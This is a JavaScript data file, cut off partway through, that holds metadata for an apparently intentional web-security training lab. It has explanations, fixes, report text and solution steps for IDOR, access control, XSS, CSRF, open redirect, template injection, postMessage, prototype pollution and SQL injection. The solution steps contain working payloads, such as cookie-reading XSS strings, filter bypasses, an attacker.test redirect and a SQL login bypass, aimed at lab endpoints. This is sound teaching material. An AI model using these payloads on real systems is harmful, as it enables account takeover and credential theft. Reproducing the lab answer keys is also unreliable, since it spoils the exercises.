/**
 * LABS_DATA — full metadata for all 31 labs.
 *
 * NOTE ON STRUCTURE: reportSummary, reportImpact, and solutionSteps are now
 * keyed by difficulty ({easy, medium, hard}) — the Report tab shows genuinely
 * different content per severity, not one generic card reused everywhere.
 * answerPlaceholder always asks for the FLAG, since verification is now real
 * (server-issued, session-bound flags — see routes/vuln-common.js) rather
 * than pattern-matching whatever text was typed in.
 */
(function () {
  var LABS_DATA = {
    categories: [
      { id: "injection", label: "Injection" },
      { id: "server-logic", label: "Server Logic" },
      { id: "client-side", label: "Client-Side" },
      { id: "auth", label: "Authentication" },
      { id: "authz", label: "Authorization" },
      { id: "infra", label: "Infrastructure" },
      { id: "enum", label: "Web Enumeration" },
      { id: "api", label: "API Security" },
      { id: "business-logic", label: "Business Logic" },
      { id: "chains", label: "Attack Chains" },
      { id: "final", label: "Final Challenge" }
    ],

    labs: [
      // ------------------------------------------------------------ AUTHZ --
      {
        id: "idor", category: "authz", title: "Insecure Direct Object Reference", shortTitle: "IDOR",
        tags: ["authz", "idor", "expert-tier"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Portal", blurb: "Access another user's data by changing an id in the URL.",
        inputContext: "URL parameter",
        goal: { explain: "IDOR happens when an app lets you access a record just by supplying its id, without checking you're entitled to see it.",
          example: "You're user 3. If the profile page trusts the id in the URL with no ownership check, visiting id=1 hands you someone else's data.",
          mission: ["Open the lab and note your id in the address bar.", "Change the id to view another user's profile.", "The FLAG appears once you've viewed someone else's data."] },
        difficultyNotes: { easy: "IDs are small sequential integers. Just change the number.", medium: "IDs are scrambled (not sequential) — enumerate nearby values.", hard: "The id is base64-encoded. Decode it, change the number, re-encode.", expert: "Direct profile access now checks ownership — try a different id and you're blocked. But a Team Directory Export accepting a batch of ids never got the same check applied." },
        why: "The endpoint fetches a record by id and returns it directly with no check that the requester owns it. At expert, that check exists for the single-record endpoint — but a separate bulk endpoint bypasses it entirely.",
        fix: "Verify server-side that the authenticated session is authorized for the requested resource before returning data — and apply that check consistently across every code path that can return the resource, including bulk/export/batch operations, not just the primary single-record endpoint.",
        reportSummary: {
          easy: "The profile endpoint accepts a plain sequential integer id and returns any matching user's data with zero ownership check.",
          medium: "Even with scrambled (non-sequential) ids, the same missing ownership check applies — the ids just take a little enumeration to find.",
          hard: "Base64-encoding the id adds a decode step for the attacker, but is not a security control — the underlying integer is still trivially recoverable.",
          expert: "The single-record profile endpoint now has a real ownership check — but a separate bulk Team Directory Export endpoint, built against a different batch-fetch code path, never received the same fix."
        },
        reportImpact: {
          easy: "Any user (or automated script) can enumerate ids 1, 2, 3... to harvest every account's PII in seconds.",
          medium: "Slightly slower to enumerate, but once the scrambling pattern is inferred, the whole user base is still harvestable.",
          hard: "Decoding base64 is a one-line operation for any attacker — the encoding provides no real protection against bulk enumeration.",
          expert: "Same full-harvest impact as every other tier, reachable even when the primary endpoint is properly protected — demonstrates that a fix applied to one code path doesn't automatically cover every other path capable of returning the same data."
        },
        solutionSteps: {
          easy: ["Note your own id (e.g. 6) shown on the page.", "Visit /vuln/idor/profile?id=1 (or any other small integer).", "The FLAG appears — you're viewing another account's data with no check."],
          medium: ["Note your own scrambled id.", "Try nearby integer values, e.g. id=225, id=262, id=299, until one resolves to a different real user.", "The FLAG appears on a successful cross-account view."],
          hard: ["Note your own base64 id, e.g. MTA= (decodes to 10).", "Decode it, pick a different number (e.g. 1), re-encode: MQ==.", "Visit /vuln/idor/profile?id=MQ== — the FLAG appears."],
          expert: ["Confirm direct access to another id is now blocked at /vuln/idor/profile.", "Visit /vuln/idor/export?ids=<your id>,2 (a comma-separated batch).", "The bulk endpoint returns every requested record with no ownership check at all.", "The FLAG appears alongside the leaked record."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "access-control", category: "authz", title: "Client-Side Access Controls", shortTitle: "Broken Access Control",
        tags: ["authz", "access-control", "access", "control"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Notes", blurb: "Bypass disabled buttons to perform actions the UI says you can't.",
        inputContext: "API request (cookie/header)",
        goal: { explain: "Access control enforced only in the UI (disabled buttons) is not real access control if the backend endpoint doesn't check permissions too.",
          example: "A 'read-only' user's Delete button is disabled in HTML, but the DELETE API might not check the user's role at all.",
          mission: ["Open the lab as a read-only viewer.", "Find a way to trigger a write action anyway.", "A successful bypass returns a FLAG in the API response."] },
        difficultyNotes: { easy: "No server-side role check exists at all — just re-enable the buttons in DevTools, or send the request directly.", medium: "The server checks a plain, editable 'role' cookie.", hard: "The role cookie is base64 JSON, and an undocumented X-Debug-Role header silently overrides your role." },
        why: "Authorization was decided from client-controlled data (HTML state, cookies, headers) instead of a trusted server-side session check.",
        fix: "Enforce authorization entirely server-side against a trusted session; never trust client-editable cookies or headers for privilege.",
        reportSummary: {
          easy: "The write endpoints (create/edit/delete note) perform zero server-side role check — the UI's disabled buttons are the only protection, and they're trivial to bypass.",
          medium: "The server checks a role cookie, but the cookie is plain text and fully editable by the client in DevTools.",
          hard: "The role cookie is base64-encoded JSON (still just obfuscation, not protection), and a leftover debug header overrides the role entirely."
        },
        reportImpact: {
          easy: "Any authenticated user, however low-privilege, can perform every write action in the app.",
          medium: "One cookie edit turns any viewer into an admin — no special tooling required, just DevTools.",
          hard: "A forgotten debug backdoor (X-Debug-Role) grants instant admin — exactly the kind of leftover from testing that ships to production by accident."
        },
        solutionSteps: {
          easy: ["Run in DevTools console: document.querySelectorAll('[disabled]').forEach(el=>el.removeAttribute('disabled'))", "Use the now-enabled Add/Edit/Delete buttons, or send the request directly with fetch().", "The FLAG appears in the API response on a successful write."],
          medium: ["Open DevTools → Application → Cookies.", "Edit the 'role' cookie value from 'viewer' to 'admin'.", "Retry the write action — the FLAG appears."],
          hard: ["Option A: send the request with header X-Debug-Role: admin.", "Option B: decode the role cookie, change it to {\"role\":\"admin\"}, base64 re-encode, and set it back.", "The FLAG appears in the API response."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "info-disclosure", category: "authz", title: "Information Disclosure", shortTitle: "Info Disclosure",
        tags: ["authz", "info-disclosure", "info", "disclosure"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Checkout", blurb: "Find sensitive data exposed where it shouldn't be.",
        inputContext: "Form field / HTTP response headers",
        goal: { explain: "Apps often leak more than they mean to — verbose error messages, forgotten debug files, or revealing response headers.",
          example: "A stack trace can leak file paths and even environment variables. A stray .git folder can leak credentials.",
          mission: ["Try to trigger an error, find an exposed file, or inspect headers — depending on difficulty.", "The FLAG appears embedded in whatever gets disclosed."] },
        difficultyNotes: { easy: "Submit a non-numeric amount to trigger a verbose error with a fake env-var dump.", medium: "An exposed .git-config file leaks fake credentials.", hard: "A custom X-Internal-Build response header leaks internal version info — check DevTools Network tab." },
        why: "Debug-level detail (stack traces, VCS folders, internal headers) was exposed in a production-like response.",
        fix: "Disable verbose errors in production, never ship .git/.env folders, and strip internal headers before responses leave the server.",
        reportSummary: {
          easy: "Submitting invalid input to the checkout form triggers an unhandled error whose stack trace includes internal file paths and a fake environment-variable dump.",
          medium: "The application's .git folder is web-accessible, leaking repository credentials via a config file that should never be served.",
          hard: "A custom internal build/version header is sent on every response, giving an attacker reconnaissance data with no visible trace on the page itself."
        },
        reportImpact: {
          easy: "Stack traces reveal internal file structure and (in a real misconfiguration) could leak real secrets from process.env.",
          medium: "Exposed VCS metadata is a common real-world finding that frequently leaks live credentials directly.",
          hard: "Version/build fingerprinting helps attackers target known vulnerabilities for that exact internal build."
        },
        solutionSteps: {
          easy: ["Submit the checkout form with amount=abc (non-numeric).", "The verbose error response includes the FLAG alongside the fake stack trace."],
          medium: ["Visit /vuln/info-disclosure/.git-config directly.", "The leaked config file includes the FLAG as a comment."],
          hard: ["Open DevTools → Network tab.", "Reload the checkout page and inspect the response headers.", "The X-Internal-Build header value contains the FLAG."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "vertical-privesc", category: "authz", title: "Vertical Privilege Escalation", shortTitle: "Vertical Privesc",
        tags: ["authz", "vertical-privesc", "vertical", "privesc"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Profile Settings", blurb: "Escalate from user to admin via a hidden form field.",
        inputContext: "Hidden form field",
        goal: { explain: "Vertical privilege escalation means a low-privilege user gains higher-privilege access — often because a role/permission value was submitted as an editable client-side field instead of being derived server-side from the session.",
          example: "A profile update form includes a hidden 'role' field. If the server trusts whatever value comes back, changing it in DevTools escalates your own account.",
          mission: ["View the profile page's source to find the hidden role field.", "Get your role set to admin for this tier.", "A FLAG appears once the Admin Panel actually grants access."] },
        difficultyNotes: { easy: "The hidden role field is trusted directly — edit it and submit.", medium: "The plain role field is now ignored — but a leftover X-Role-Override debug header is trusted unconditionally.", hard: "The header is also fixed on this endpoint — but a secondary 'bulk update' API endpoint still has the original bug." },
        why: "Each fix patched the specific input the developer noticed was exploited, without checking whether the same trust decision existed anywhere else.",
        fix: "Derive role/permission from the authenticated server-side session only — never accept it as client-submitted data on any endpoint, including secondary/legacy ones.",
        reportSummary: {
          easy: "The profile update endpoint trusts a hidden 'role' field submitted directly by the client.",
          medium: "The visible role field is ignored, but an internal debug header (X-Role-Override) is trusted with no restriction.",
          hard: "The primary update endpoint is fully fixed, but a secondary bulk-update API endpoint still honors the original unguarded role field."
        },
        reportImpact: {
          easy: "Instant self-service privilege escalation to full admin access.",
          medium: "Same escalation via a forgotten internal debug feature.",
          hard: "Same escalation via a secondary code path that a partial fix missed — a realistic outcome of remediating only the reported endpoint."
        },
        solutionSteps: {
          easy: ["Edit the hidden role field to 'admin' and submit the profile form.", "Visit the Admin Panel — the FLAG appears."],
          medium: ["Send the update request with header X-Role-Override: admin.", "Visit the Admin Panel — the FLAG appears."],
          hard: ["Discover and call /vuln/vertical-privesc/bulk-update?role=admin directly.", "Visit the Admin Panel — the FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "multi-tenant-isolation", category: "authz", title: "Multi-Tenant Isolation Bypass", shortTitle: "Multi-Tenant Isolation",
        tags: ["authz", "multi-tenant-isolation", "multi", "tenant", "isolation"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Admin Console", blurb: "Access another organization's data in a shared, multi-tenant API.",
        inputContext: "API endpoint (URL parameter + cookie/header)",
        goal: { explain: "In multi-tenant SaaS apps, every request needs to prove it belongs to the tenant it's requesting data for — not just that the tenant id LOOKS like a valid id.",
          example: "Changing tenantId in an API call from your own organization's id to another one can return their private data if ownership is never actually checked.",
          mission: ["View your own tenant's data first.", "Access a different tenant's data using the technique for this difficulty.", "A FLAG appears once cross-tenant data is actually returned."] },
        difficultyNotes: { easy: "No ownership check at all — just change tenantId in the URL.", medium: "A tenantId cookie now gates access — but it's a plain, client-editable cookie.", hard: "The cookie is replaced by an X-Tenant-Token header that looks signed, but it's just a reversed version of the tenantId — compute it yourself." },
        why: "Each version added a check, but none of them cryptographically verify that the requester is actually a member of the requested tenant.",
        fix: "Verify tenant membership server-side against a trusted session/database record — never trust a client-supplied or client-editable value as proof of tenant ownership.",
        reportSummary: {
          easy: "The API returns any tenant's data for whatever tenantId is requested, with zero ownership check.",
          medium: "A tenantId cookie gates access, but since it's plain and client-editable, it provides no real protection.",
          hard: "An X-Tenant-Token header looks like a signature but is actually just the tenantId reversed — trivially computable, not real cryptographic proof."
        },
        reportImpact: {
          easy: "Complete cross-tenant data disclosure, including confidential business information.",
          medium: "Same disclosure — editing a cookie is barely more effort than changing a URL parameter.",
          hard: "Same disclosure — demonstrates that a 'token' that isn't cryptographically verified provides no real isolation guarantee."
        },
        solutionSteps: {
          easy: ["Request /vuln/multi-tenant-isolation/api?tenantId=t-200", "The FLAG appears."],
          medium: ["Edit the tenantId cookie to t-200, then request the API with tenantId=t-200.", "The FLAG appears."],
          hard: ["Compute the reverse of \"t-200\" (\"002-t\") and send it as X-Tenant-Token.", "Request the API with tenantId=t-200 — the FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },

      // -------------------------------------------------------- CLIENT-SIDE
      {
        id: "xss", category: "client-side", title: "Cross-Site Scripting", shortTitle: "XSS",
        tags: ["client-side", "xss"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Notes Search", blurb: "Inject a script that runs in another user's browser.",
        inputContext: "URL parameter",
        goal: { explain: "Reflected XSS happens when user input is echoed into HTML without encoding, letting an attacker run JS in the victim's session.",
          example: "Search for <h1>pwned</h1> — if it renders as an actual heading instead of literal text, you've found it.",
          mission: ["Search for a payload that survives the filter for this difficulty.", "A FLAG appears in the results box once a live tag actually survives."] },
        difficultyNotes: { easy: "No filtering at all.", medium: "The literal text '<script' is stripped — try an event-handler payload.", hard: "<script, onerror=, and onload= are all stripped — try a handler the filter doesn't know about." },
        why: "User input is concatenated into the HTML response without encoding, and denylist filters are inherently incomplete.",
        fix: "Contextually encode all output, adopt a strict CSP, and mark session cookies HttpOnly.",
        reportSummary: {
          easy: "The search endpoint reflects the q parameter into the page with zero output encoding — any HTML/JS is injected as-is.",
          medium: "A denylist strips the literal string '<script', but any other tag or event handler still executes.",
          hard: "The denylist also strips onerror= and onload=, but doesn't cover every event handler — autofocus+onfocus still fires."
        },
        reportImpact: {
          easy: "Trivial full account takeover via cookie theft — any crafted link executes arbitrary JS in the victim's session.",
          medium: "The filter blocks the most obvious payload shape but is bypassed in seconds with a well-known alternate vector.",
          hard: "Even a two-keyword denylist leaves dozens of other event handlers open — denylisting HTML/JS injection points is fundamentally incomplete."
        },
        solutionSteps: {
          easy: ["Search for: <script>alert(document.cookie)</script>", "The script executes and the FLAG appears in the results box (a real tag survived unfiltered)."],
          medium: ["Search for: <img src=x onerror=alert(document.cookie)>", "'<script' isn't present, so the filter doesn't touch it — the FLAG appears."],
          hard: ["Search for: <input autofocus onfocus=alert(document.cookie)>", "autofocus triggers onfocus immediately, and onfocus isn't on the blocklist — the FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "csrf", category: "client-side", title: "Cross-Site Request Forgery", shortTitle: "CSRF",
        tags: ["client-side", "csrf"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Account", blurb: "Force a logged-in victim to perform an action they didn't intend.",
        inputContext: "Forged cross-site request",
        goal: { explain: "CSRF happens when a state-changing action can be triggered by a simple cross-site request, since the browser auto-attaches cookies.",
          example: "Account deletion via plain GET, no token, no confirmation — any page can embed an <img> pointing at it.",
          mission: ["Log in and find the Danger Zone.", "Trigger the deletion via the appropriate technique for this difficulty.", "A FLAG appears once the deletion actually succeeds."] },
        difficultyNotes: { easy: "No protection — an <img> tag fires it.", medium: "A shallow Origin check exists but <img> requests don't send Origin, so it's still bypassed.", hard: "Subresource requests (img/fetch) are blocked, but a real top-level link click still works." },
        why: "A destructive action is reachable via GET with no CSRF token, relying only on the browser's ambient cookie authority.",
        fix: "Never perform state changes on GET; require a validated anti-CSRF token; set cookies SameSite=Lax/Strict as defense in depth.",
        reportSummary: {
          easy: "Account deletion is a plain GET request with no CSRF token, no confirmation, and no same-site cookie protection whatsoever.",
          medium: "A shallow Origin-header check was added, but it only inspects the header IF present — simple GETs like <img> don't send one.",
          hard: "Subresource loads are blocked via Fetch Metadata (Sec-Fetch-Mode), but a genuine top-level navigation is indistinguishable from a legitimate click and still succeeds."
        },
        reportImpact: {
          easy: "Any page the victim visits while logged in can silently delete their account.",
          medium: "The added check gives a false sense of security — the exact same <img> trick from 'easy' still works.",
          hard: "Even a real defense-in-depth control (Fetch Metadata) can't stop an attacker who lures the victim into clicking a real link."
        },
        solutionSteps: {
          easy: ["Open the CSRF PoC attacker page (or embed <img src='/vuln/csrf/delete'> anywhere).", "Just loading that page while logged in fires the deletion.", "The FLAG appears on the deletion confirmation page."],
          medium: ["Same <img> trick as easy — the Origin check never triggers because <img> doesn't send an Origin header.", "The FLAG appears once the account is actually deleted."],
          hard: ["The <img>/fetch trick is now blocked (Sec-Fetch-Mode check).", "Use the visible link on the attacker PoC page instead — a real click is a top-level navigation.", "The FLAG appears once the deletion succeeds via the link click."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "open-redirect", category: "client-side", title: "Open Redirect", shortTitle: "Open Redirect",
        tags: ["client-side", "open-redirect", "open", "redirect"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp SSO", blurb: "Abuse a trusted domain's redirect to send victims somewhere malicious.",
        inputContext: "URL parameter",
        goal: { explain: "An open redirect lets an attacker craft a link on a trusted domain that actually sends the victim elsewhere — great for phishing.",
          example: "?next=https://attacker.test on a trusted login page looks safe to click but ends up off-domain.",
          mission: ["Get next to point somewhere genuinely off-domain.", "A FLAG appears once a real off-domain redirect is confirmed."] },
        difficultyNotes: { easy: "Any absolute URL works.", medium: "next must start with a single '/' — try a protocol-relative '//' URL instead.", hard: "next must merely contain 'securecorp-demo.test' anywhere — a domain like securecorp-demo.test.attacker.com passes." },
        why: "The redirect target is validated with a naive prefix/substring check instead of a strict allowlist of exact hosts.",
        fix: "Validate against an exact allowlist of hosts (or only allow relative paths validated with a real URL parser), never a substring/prefix check.",
        reportSummary: {
          easy: "The next parameter is used directly with no validation whatsoever.",
          medium: "A check requires next to start with '/', but protocol-relative URLs ('//host') also start with '/' and are still treated as absolute by browsers.",
          hard: "A substring check for 'securecorp-demo.test' is satisfied by any domain that merely contains that string anywhere, including as a subdomain of an attacker's own domain."
        },
        reportImpact: {
          easy: "Trivially usable in phishing — the link visibly points at the trusted domain right up until the redirect.",
          medium: "The '/' requirement looks like a fix but doesn't account for how browsers treat protocol-relative URLs as absolute.",
          hard: "Substring checks on domains are a classic, still-common real-world bug — 'contains' is not the same as 'is'."
        },
        solutionSteps: {
          easy: ["?next=https://attacker.test", "The FLAG appears confirming a genuine off-domain redirect."],
          medium: ["?next=//attacker.test", "This starts with '/' (passes the check) but browsers treat // as protocol-relative — an absolute redirect off-domain. FLAG appears."],
          hard: ["?next=https://securecorp-demo.test.attacker.test", "Contains the trusted substring but is actually attacker.test's subdomain. FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "cstl", category: "client-side", title: "Client-Side Template Injection", shortTitle: "CSTI",
        tags: ["client-side", "cstl", "client-side-proof"],
        successCondition: "Client-proof token: the client-side exploit must genuinely execute and POST a single-use proof token back to the server, which then issues the real flag.",
        demoApp: "SecureCorp Comment Preview", blurb: "Break out of a client-side template evaluator.",
        inputContext: "Form field (client-side)",
        goal: { explain: "Some front-ends evaluate {{ }} expressions client-side (à la old AngularJS). If user input reaches that evaluator, it can execute arbitrary JS in your own browser.",
          example: "{{7*7}} rendering as 49 confirms live evaluation is happening on your input.",
          mission: ["Confirm {{7*7}} evaluates.", "Escalate to a real JS execution payload for this difficulty — a FLAG appears once it succeeds."] },
        difficultyNotes: { easy: "No filtering — the classic constructor-chain payload works directly.", medium: "The word 'constructor' is stripped before evaluation — try a payload built around the global Function instead.", hard: "Both 'constructor' and 'Function' are stripped as literal words — build 'Function' at runtime via string concatenation so it never appears literally in your payload." },
        why: "The client-side template evaluator runs on untrusted input with no sandboxing, and word-based denylists are trivially defeated by finding an equivalent primitive that doesn't contain the filtered word.",
        fix: "Never evaluate user input as a template expression client-side; use safe interpolation (textContent) instead — no denylist can fully close this class of bug.",
        reportSummary: {
          easy: "{{7*7}} evaluating to 49 confirms live evaluation, and the classic constructor-chain payload works with no filtering at all.",
          medium: "The literal word 'constructor' is stripped before evaluation, but the equally-capable global Function identifier isn't filtered.",
          hard: "Both 'constructor' and 'Function' are stripped as literal words, but building the string \"Function\" at runtime via concatenation ('Func'+'tion') never triggers either filter."
        },
        reportImpact: {
          easy: "Full arbitrary JS execution in whichever browser tab renders the comment.",
          medium: "Same full execution — filtering one keyword doesn't remove equivalent capabilities under a different name.",
          hard: "Same full execution — demonstrates that literal-string denylists are fundamentally bypassable via trivial string construction."
        },
        solutionSteps: {
          easy: ["Type {{7*7}} to confirm evaluation.", "Type {{constructor.constructor('alert(1)')()}}", "The FLAG appears."],
          medium: ["Type {{Function('alert(1)')()}} — avoids the filtered word 'constructor' entirely.", "The FLAG appears."],
          hard: ["Type {{globalThis['Func'+'tion']('alert(1)')()}} — 'Function' is built at runtime, so the literal word never appears in the source.", "The FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "postmessage", category: "client-side", title: "postMessage Vulnerabilities", shortTitle: "postMessage",
        tags: ["client-side", "postmessage", "client-side-proof"],
        successCondition: "Client-proof token: the client-side exploit must genuinely execute and POST a single-use proof token back to the server, which then issues the real flag.",
        demoApp: "SecureCorp Wallet", blurb: "Forge cross-window messages because the origin is never checked.",
        inputContext: "postMessage payload (client-side)",
        goal: { explain: "window.postMessage lets pages talk across origins. If the receiver doesn't check event.origin, any page can send it forged data — even if it checks OTHER things about the message.",
          example: "A wallet widget updates your balance via postMessage — but from ANY sender, not just the real widget, since the receiver never confirms who actually sent it.",
          mission: ["Open the Wallet page, then open the linked attacker page from it (so window.opener is set).", "Fill in the fields required for this difficulty and send a forged balance.", "A FLAG appears when it's accepted."] },
        difficultyNotes: { easy: "No validation at all — any {balance:N} message is accepted.", medium: "The listener now also requires a source:'legit-widget' field — view-source the widget iframe to find the expected value.", hard: "The listener also requires a token field matching a per-session value embedded in the wallet page's source (view-source to find it) — not shown anywhere in the visible UI." },
        why: "Checking properties of the MESSAGE DATA (like a source label or even a token embedded in client-visible code) is not the same as checking WHO sent it — event.origin is the only thing an attacker's own page can't forge.",
        fix: "Always validate event.origin against an exact expected origin before trusting postMessage data — content-based checks alone are never sufficient since the attacker controls all the content.",
        reportSummary: {
          easy: "The wallet's message listener accepts a balance update from any origin with no verification of the data at all.",
          medium: "The listener now requires a source field, but since it's just part of the message content, an attacker can trivially include it too — origin still isn't checked.",
          hard: "The listener also requires a token, but it's exposed in the wallet page's own client-side source, so it's discoverable and equally forgeable."
        },
        reportImpact: {
          easy: "Any malicious tab can silently rewrite application state in another open tab.",
          medium: "Same impact as easy — a content-based check doesn't stop an attacker who can simply match the expected content.",
          hard: "Same impact as easy — even a 'secret' token doesn't help if it's reachable via the same client-side surface an attacker can already inspect."
        },
        solutionSteps: {
          easy: ["Open the attacker page from the Wallet tab.", "Enter a forged balance and send.", "The FLAG appears in the Wallet tab."],
          medium: ["View-source the Wallet page's widget iframe to find the required source value ('legit-widget').", "On the attacker page, enter the balance AND that source value, then send.", "The FLAG appears."],
          hard: ["View-source the Wallet page itself to find the embedded PAGE_TOKEN value.", "On the attacker page, enter the balance, source ('legit-widget'), and that token, then send.", "The FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "prototype-pollution", category: "client-side", title: "Prototype Pollution", shortTitle: "Prototype Pollution",
        tags: ["client-side", "prototype-pollution", "prototype", "pollution", "client-side-proof"],
        successCondition: "Client-proof token: the client-side exploit must genuinely execute and POST a single-use proof token back to the server, which then issues the real flag.",
        demoApp: "SecureCorp Theme Customizer", blurb: "Pollute Object.prototype to unlock a hidden admin link.",
        inputContext: "URL parameter (bracket notation)",
        goal: { explain: "A naive recursive merge function that doesn't block dangerous keys can let you pollute Object.prototype itself — affecting every object in the page.",
          example: "?__proto__[isAdmin]=true merged in without a guard can make ({}).isAdmin true for the whole page.",
          mission: ["View the page source to see the merge() function and its denylist for this difficulty.", "Craft a query string that pollutes isAdmin using a key the denylist doesn't block.", "The FLAG appears alongside the unlocked Admin Panel link."] },
        difficultyNotes: { easy: "No denylist at all — __proto__ works directly.", medium: "The exact key '__proto__' is now blocked — reach the same prototype through constructor[prototype] instead.", hard: "'__proto__', 'constructor', AND 'prototype' are all blocked — this is actually a complete, correct fix for this bug. There's no bypass here." },
        why: "The merge function assigns into whatever key is given; at easy/medium it doesn't block every path that reaches the shared prototype.",
        fix: "Block __proto__, constructor, and prototype keys explicitly in any recursive merge/extend utility, or use Object.create(null) / Map instead of plain objects.",
        reportSummary: {
          easy: "The merge() function has no denylist for dangerous keys at all, so __proto__ is walked into like any other property.",
          medium: "The literal key '__proto__' is blocked, but 'constructor' and 'prototype' aren't — and constructor.prototype resolves to the exact same shared object.",
          hard: "'__proto__', 'constructor', and 'prototype' are all blocked at every recursion level — this genuinely closes off every path to the shared prototype for this merge pattern."
        },
        reportImpact: {
          easy: "A single crafted URL can flip a security-relevant flag for the entire page's lifetime.",
          medium: "Same impact as easy — blocking one of three equivalent paths to the same object isn't a real fix.",
          hard: "Not exploitable — included to show what a genuinely complete denylist looks like for this specific bug pattern."
        },
        solutionSteps: {
          easy: ["Visit /vuln/prototype-pollution?__proto__[isAdmin]=true", "The Admin Panel link unlocks and the FLAG appears."],
          medium: ["Visit /vuln/prototype-pollution?constructor[prototype][isAdmin]=true — reaches Object.prototype via a different, unblocked path.", "The FLAG appears."],
          hard: ["Not exploitable at this tier via this merge pattern — confirm that for yourself and note it in your report rather than guessing further payloads."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "secondary-context", category: "server-logic", title: "Secondary Context Vulnerabilities", shortTitle: "Secondary Context",
        tags: ["server-logic", "secondary-context", "secondary", "context"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Support", blurb: "Input that's safe in one place gets executed unsafely somewhere else.",
        inputContext: "Form field (stored, rendered elsewhere)",
        goal: { explain: "Some inputs look harmless where you enter them, but get reused unsafely in a totally different, later context — like an admin viewer.",
          example: "A support ticket message looks like plain text on the submission page, but the admin viewer renders it as raw HTML.",
          mission: ["Submit a ticket with an XSS payload as the message.", "Open the Admin Ticket Viewer — a FLAG appears there if your payload survives its filter."] },
        difficultyNotes: { easy: "No filtering in the admin viewer.", medium: "'<script' is stripped in the admin viewer — try an event handler.", hard: "<script/onerror/onload are all stripped — try an unfiltered handler like onfocus." },
        why: "The same output-encoding bug as XSS, but the vulnerable rendering happens in a different feature/context than where the input was collected — easy to miss in a review that only checks the input form.",
        fix: "Apply output encoding wherever data is rendered, not just where it's collected — audit every context a stored value can end up in.",
        reportSummary: {
          easy: "Ticket messages are rendered as raw HTML in the admin viewer with no encoding at all.",
          medium: "The admin viewer strips '<script' specifically, but other tags/handlers pass through untouched.",
          hard: "The admin viewer strips script/onerror/onload, but not every event handler — onfocus still works."
        },
        reportImpact: {
          easy: "Any user can submit a ticket that executes JS in a staff member's browser once viewed.",
          medium: "The partial filter is bypassed with the same well-known alternate vectors as reflected XSS.",
          hard: "Even a three-keyword denylist leaves real gaps — this is why context-aware output encoding, not filtering, is the real fix."
        },
        solutionSteps: {
          easy: ["Submit a ticket with message=<script>alert(document.cookie)</script>", "Open the Admin Ticket Viewer — the FLAG appears next to your payload."],
          medium: ["Submit a ticket with message=<img src=x onerror=alert(document.cookie)>", "Open the Admin Ticket Viewer — the FLAG appears."],
          hard: ["Submit a ticket with message=<input autofocus onfocus=alert(document.cookie)>", "Open the Admin Ticket Viewer — the FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },

      // ---------------------------------------------------------- INJECTION
      {
        id: "sql-injection", category: "injection", title: "SQL Injection", shortTitle: "SQL Injection",
        tags: ["injection", "sql-injection", "sql", "expert-tier"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Employee Directory", blurb: "Manipulate a real SQL query via unsanitized login/search fields.",
        inputContext: "Form field",
        goal: { explain: "SQL injection happens when user input is concatenated directly into a SQL query, letting an attacker change the query's logic.",
          example: "Username admin' -- turns WHERE username='admin' AND password='...' into a query that ignores the password check entirely.",
          mission: ["Try to log in as admin without knowing the password.", "If the login form gets locked down, try the department search box instead.", "A FLAG appears once the admin account is actually reached via injection."] },
        difficultyNotes: { easy: "Login form has no escaping at all.", medium: "Password field is escaped, username field isn't.", hard: "Login is fully safe — but the department search box is always vulnerable to UNION-based injection.", expert: "Login and search are both fully parameterized now. A separate Department Notes feature stores input safely too — but a second, later feature (Audit Log) re-reads that already-stored value into a brand-new, unescaped query." },
        why: "Raw string concatenation builds the SQL query, so attacker-controlled quotes and keywords change its structure.",
        fix: "Use parameterized queries/prepared statements everywhere — including every time a value is reused later, not just at its original entry point.",
        reportSummary: {
          easy: "The login query concatenates both username and password fields directly into SQL with zero escaping.",
          medium: "The password field is escaped, but the username field still reaches the query unescaped — the comment-based bypass still works.",
          hard: "The login form is fully parameterized and safe — but the separate department search field builds its query unsafely, permitting UNION-based extraction from any table.",
          expert: "Every direct entry point (login, search, note storage) is properly parameterized. The bug is second-order: a value already safely stored in the database is later re-embedded into a new raw SQL string with no escaping, on the incorrect assumption that anything already in the database must be safe."
        },
        reportImpact: {
          easy: "Full authentication bypass — any account, including admin, is reachable without a password.",
          medium: "Same full bypass — escaping only one of two concatenated fields doesn't fix the query.",
          hard: "The real password itself is exfiltrated via UNION — worse than a login bypass, since it also compromises the credential everywhere it's reused.",
          expert: "Same full credential exfiltration impact, reachable even when every direct input is properly parameterized — demonstrates that parameterizing an INSERT does not make every future SELECT that reuses the same data automatically safe."
        },
        solutionSteps: {
          easy: ["Username: admin' --", "Password: (anything)", "This comments out the password check. The FLAG appears alongside the successful login."],
